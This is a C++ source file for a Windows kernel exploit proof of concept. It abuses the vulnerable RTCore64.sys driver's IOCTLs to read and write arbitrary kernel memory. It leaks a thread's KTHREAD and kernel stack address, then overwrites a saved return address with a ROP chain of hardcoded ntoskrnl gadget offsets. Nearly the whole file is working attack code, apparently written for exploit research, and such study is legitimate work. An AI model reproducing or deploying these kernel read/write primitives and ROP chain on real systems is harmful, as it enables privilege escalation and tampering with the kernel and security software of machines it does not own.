
#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <tchar.h>

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
#define STATUS_SUCCESS 0x00000000

typedef enum _SYSTEM_INFORMATION_CLASS
{
	SystemBasicInformation,
	SystemProcessorInformation,
	SystemPerformanceInformation,
	SystemTimeOfDayInformation,
	SystemPathInformation,
	SystemProcessInformation,
	SystemCallCountInformation,
	SystemDeviceInformation,
	SystemProcessorPerformanceInformation,
	SystemFlagsInformation,
	SystemCallTimeInformation,
	SystemModuleInformation,
	SystemLocksInformation,
	SystemStackTraceInformation,
	SystemPagedPoolInformation,
	SystemNonPagedPoolInformation,
	SystemHandleInformation,
	SystemObjectInformation,
	SystemPageFileInformation,
	SystemVdmInstemulInformation,
	SystemVdmBopInformation,
	SystemFileCacheInformation,
	SystemPoolTagInformation,
	SystemInterruptInformation,
	SystemDpcBehaviorInformation,
	SystemFullMemoryInformation,
	SystemLoadGdiDriverInformation,
	SystemUnloadGdiDriverInformation,
	SystemTimeAdjustmentInformation,
	SystemSummaryMemoryInformation,
	SystemMirrorMemoryInformation,
	SystemPerformanceTraceInformation,
	SystemObsolete0,
	SystemExceptionInformation,
	SystemCrashDumpStateInformation,
	SystemKernelDebuggerInformation,
	SystemContextSwitchInformation,
	SystemRegistryQuotaInformation,
	SystemExtendServiceTableInformation,
	SystemPrioritySeperation,
	SystemVerifierAddDriverInformation,
	SystemVerifierRemoveDriverInformation,
	SystemProcessorIdleInformation,
	SystemLegacyDriverInformation,
	SystemCurrentTimeZoneInformation,
	SystemLookasideInformation,
	SystemTimeSlipNotification,
	SystemSessionCreate,
	SystemSessionDetach,
	SystemSessionInformation,
	SystemRangeStartInformation,
	SystemVerifierInformation,
	SystemVerifierThunkExtend,
	SystemSessionProcessInformation,
	SystemLoadGdiDriverInSystemSpace,
	SystemNumaProcessorMap,
	SystemPrefetcherInformation,
	SystemExtendedProcessInformation,
	SystemRecommendedSharedDataAlignment,
	SystemComPlusPackage,
	SystemNumaAvailableMemory,
	SystemProcessorPowerInformation,
	SystemEmulationBasicInformation,
	SystemEmulationProcessorInformation,
	SystemExtendedHandleInformation,
	SystemLostDelayedWriteInformation,
	SystemBigPoolInformation,
	SystemSessionPoolTagInformation,
	SystemSessionMappedViewInformation,
	SystemHotpatchInformation,
	SystemObjectSecurityMode,
	SystemWatchdogTimerHandler,
	SystemWatchdogTimerInformation,
	SystemLogicalProcessorInformation,
	SystemWow64SharedInformation,
	SystemRegisterFirmwareTableInformationHandler,
	SystemFirmwareTableInformation,
	SystemModuleInformationEx,
	SystemVerifierTriageInformation,
	SystemSuperfetchInformation,
	SystemMemoryListInformation,
	SystemFileCacheInformationEx,
	MaxSystemInfoClass

} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	BYTE                 Name[256];
} SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	ULONG ProcessId;
	UCHAR ObjectTypeNumber;
	UCHAR Flags;
	USHORT Handle;
	void* Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

// Prototype for ntdll!NtQuerySystemInformation
typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

NtQuerySystemInformation_t resolveFunc(void)
{

	HMODULE ntdllHandle = GetModuleHandleW(L"ntdll.dll");

	NtQuerySystemInformation_t func = (NtQuerySystemInformation_t)GetProcAddress(ntdllHandle,"NtQuerySystemInformation");

	if (func == NULL)
	{
		goto exit;
	}
	else
	{

		printf("[+] ntdll!NtQuerySystemInformation: 0x%p\n", func);

		return func;
	}

exit:

	return (NtQuerySystemInformation_t)1;
}

ULONG64 leakKTHREAD(HANDLE dummythreadHandle)
{

	NTSTATUS retValue = STATUS_INFO_LENGTH_MISMATCH;

	NtQuerySystemInformation_t NtQuerySystemInformation = resolveFunc();

	int size = 1;

	int outSize = 0;

	PSYSTEM_HANDLE_INFORMATION out = (PSYSTEM_HANDLE_INFORMATION)malloc(size);

	if (out == NULL)
	{
		goto exit;
	}

	do
	{

		free(out);

		size = size * 2;

		out = (PSYSTEM_HANDLE_INFORMATION)malloc(size);

		if (out == NULL)
		{

			goto exit;
		}

		retValue = NtQuerySystemInformation(
			SystemHandleInformation,
			out,
			(ULONG)size,
			(PULONG)&outSize
		);
	} while (retValue == STATUS_INFO_LENGTH_MISMATCH);

	if (retValue != STATUS_SUCCESS)
	{

		if (out != NULL)
		{

			free(out);

			goto exit;
		}

		goto exit;
	}
	else
	{

		for (ULONG i = 0; i < out->NumberOfHandles; i++)
		{

			DWORD objectType = out->Handles[i].ObjectTypeNumber;

			if (out->Handles[i].ProcessId == GetCurrentProcessId())
			{

				if (dummythreadHandle == (HANDLE)out->Handles[i].Handle)
				{

					ULONG64 kthreadObject = (ULONG64)out->Handles[i].Object;

					free(out);

					return kthreadObject;
				}
			}
		}
	}

exit:

	CloseHandle(
		dummythreadHandle
	);

	return (ULONG64)retValue;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/// 
/// Driver related stuff
/// 

static const DWORD RTCORE64_MEMORY_READ_CODE =	0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;
static const DWORD RTCORE64_TRIGGER =			0x80002050;				// trigger

#define ARRAY_SIZE1 1024

struct RTCORE64_MEMORY_READ
{
	BYTE Pad0[8];

	DWORD64 Address;

	BYTE Pad1[8];

	DWORD ReadSize;

	DWORD Value;

	BYTE Pad3[16];
};

DWORD ReadMemoryPrimitive(HANDLE device, DWORD size, DWORD64 address)
{
	RTCORE64_MEMORY_READ MemoryRead{};

	MemoryRead.Address = address;

	MemoryRead.ReadSize = size;

	DWORD BytesReturned;

	DeviceIoControl(device, RTCORE64_MEMORY_READ_CODE, &MemoryRead, sizeof(MemoryRead), &MemoryRead, sizeof(MemoryRead), &BytesReturned, nullptr);

	return MemoryRead.Value;
}

DWORD ReadMemoryDWORD(HANDLE device, DWORD64 address)
{
	return ReadMemoryPrimitive(device, 4, address);
}

DWORD64 ReadMemoryDWORD64(HANDLE device, DWORD64 address)
{
	return (static_cast<DWORD64>(ReadMemoryDWORD(device, address + 4)) << 32) | ReadMemoryDWORD(device, address);
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value)
{
	RTCORE64_MEMORY_READ MemoryRead{};

	MemoryRead.Address = Address;

	MemoryRead.ReadSize = Size;

	MemoryRead.Value = Value;

	DWORD BytesReturned;

	DeviceIoControl(Device, RTCORE64_MEMORY_WRITE_CODE, &MemoryRead, sizeof(MemoryRead), &MemoryRead, sizeof(MemoryRead), &BytesReturned, nullptr);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value)
{
	WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);

	WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
}


DWORD64 find_kernel_base()
{
	LPVOID drivers[1024];
	DWORD lpcbNeeded;
	DWORD64 kernel_image_base;
	int c_drivers = 0;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &lpcbNeeded))
	{
		kernel_image_base = (DWORD64)drivers[0];
		c_drivers = lpcbNeeded / sizeof(drivers[0]);
	}
	else
	{
		printf("[-] Failed to enumerate device drivers\n\n");
		return -1;
	}

	return kernel_image_base;

}

DWORD64 enum_drvs(void)
{
	LPVOID drivers[ARRAY_SIZE1];
	DWORD cbNeeded;
	int cDrivers, i;
	DWORD64 driver_base_address;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		TCHAR szDriver[ARRAY_SIZE1];
		cDrivers = cbNeeded / sizeof(drivers[0]);

		for (i = 0; i < cDrivers; i++)
		{

			driver_base_address = (DWORD64)drivers[i];

			if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0])))
			{

				TCHAR target_drv[] = L"RTCore64.sys";

				if (_tcsicmp(szDriver, target_drv) == 0)
				{

					_tprintf(TEXT("%d: %s\n"), i + 1, szDriver);

					printf("[+] vuln driver found\n");

					printf("[+] vuln drv base address : 0x%llx\n", driver_base_address);

					break;

				}

			}
		}
	}
	else
	{
		_tprintf(TEXT("[-] EnumDeviceDrivers failed; array size needed is %d\n"), cbNeeded / sizeof(LPVOID));
		return 1;
	}

	return driver_base_address;
}

DWORD64 pte_base_ptr;

DWORD64 get_va_pte(DWORD64 va)
{

	DWORD64 test_pte = va >> 9;
	test_pte &= 0x7ffffffff8;
	test_pte += pte_base_ptr;

	return test_pte;

}

void fake_func() {};

HANDLE create_dummy_thread(void)
{

	HANDLE dummyThread = CreateThread(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)fake_func,
		NULL,
		CREATE_SUSPENDED,
		NULL
	);

	if (dummyThread == (HANDLE)-1)
	{

		goto exit;
	}
	else
	{

		return dummyThread;
	}

exit:

	return (HANDLE)-1;
}

BOOL constructROPChain(HANDLE inHandle, HANDLE dummyThread, ULONG64 KTHREAD, ULONG64 ntBase)
{
	// KTHREAD.StackBase = KTHREAD + 0x38
	ULONG64 kthreadstackBase = KTHREAD + 0x38;

	// Dereference KTHREAD.StackBase to leak the stack
	ULONG64 stackBase = ReadMemoryDWORD64(inHandle, kthreadstackBase);

	printf("[+] Leaked kernel-mode stack: 0x%llx\n", stackBase);

	ULONG64 retAddr = 0;

	for (int i = 0x8; i < 0x7000 - 0x8; i += 0x8)
	{

		ULONG64 value = ReadMemoryDWORD64(inHandle, stackBase - i);

		if ((value & 0xfffff00000000000) == 0xfffff00000000000)
		{

			if (value == ntBase + 0x3fb510)
			{

				printf("[+] Leaked target return address of nt!KiApcInterrupt!\n");

				retAddr = stackBase - i;

				break;
			}
		}

		value = 0;
	}

	printf("[+] Stack address: 0x%llx contains nt!KiApcInterrupt+0x328!\n", retAddr);

	DWORD64 kernel_api_result = 0;

	WriteMemoryDWORD64(inHandle, retAddr,		ntBase + 0x2017f2);				// pop rax, ret
	WriteMemoryDWORD64(inHandle, retAddr + 8,	ntBase + 0x23a4b0);				// psgetcurrentprocess 00000000`0023a4b0
	WriteMemoryDWORD64(inHandle, retAddr + 16,  ntBase + 0x205a05);				// jmp rax
	WriteMemoryDWORD64(inHandle, retAddr + 24,  ntBase + 0x205dbc);				// pop rcx, ret
	WriteMemoryDWORD64(inHandle, retAddr + 32,  (DWORD64)&kernel_api_result);	// where the result will end up  
	WriteMemoryDWORD64(inHandle, retAddr + 40,	ntBase + 0x26d69a);				// mov [rcx], rax; ret
	
	// at this point we want to kill the thread in a clean and graceful manner using zeterminatethread
	// zeterminatethread(dummy_thread_handle, status_code_success = 0)

	WriteMemoryDWORD64(inHandle, retAddr + 48,  ntBase + 0x205dbc);				// pop rcx; ret
	WriteMemoryDWORD64(inHandle, retAddr + 56,  (DWORD64)dummyThread);			// handle to the dummy thread to pass to zwterminatethread
	
	WriteMemoryDWORD64(inHandle, retAddr + 64,  ntBase + 0x3ae022);				// pop rdx; ret
	WriteMemoryDWORD64(inHandle, retAddr + 72,  0);								// set exit code to success
	
	WriteMemoryDWORD64(inHandle, retAddr + 80,  ntBase + 0x2017f2);				// pop rax; ret
	WriteMemoryDWORD64(inHandle, retAddr + 88,  ntBase + 0x3f4100);				// zwterminatethread
	
	WriteMemoryDWORD64(inHandle, retAddr + 96,  ntBase + 0x3ae023);				// just a  ret;	
	WriteMemoryDWORD64(inHandle, retAddr + 104, ntBase + 0x205a05);				// jmp rax;


	printf("[+] Press any key to resume thread\n");
	getchar();

	// Resume the thread to kick off execution
	ResumeThread(dummyThread);

exit:

	return (ULONG64)1;

}


int main()
{
 
	// Get handle to the driver
	HANDLE device = CreateFile((LPCWSTR)L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, NULL);

	if (device == INVALID_HANDLE_VALUE)
	{
		printf("[+] Failed to get a handle to the device.\n");

		return -1;
	}
	else
	{
		printf("[+] Got a handle to the device\n");
	}

	// find the address of the kernel
	DWORD64 kernel_image_base = NULL;

	kernel_image_base = find_kernel_base();

	if (kernel_image_base == NULL)
	{
		printf("[-] Failed to find the kernel address\n");
		return -1;
	}

	printf("[+] Kernel address: 0x%llx\n", kernel_image_base);

	HANDLE dummy_thread_handle = create_dummy_thread();

	printf("[+] Dummy thread handle: 0x%llx\n", dummy_thread_handle);

	ULONG64 kthread = leakKTHREAD(dummy_thread_handle);

	printf("[+] ktheread address: 0x%llx\n", kthread);

	printf("kthread found. press any key to construct ROP\n");
	getchar();

	constructROPChain(device, dummy_thread_handle, kthread, kernel_image_base);

	printf("Examine kthread\n");
	getchar();

	return 0;

}

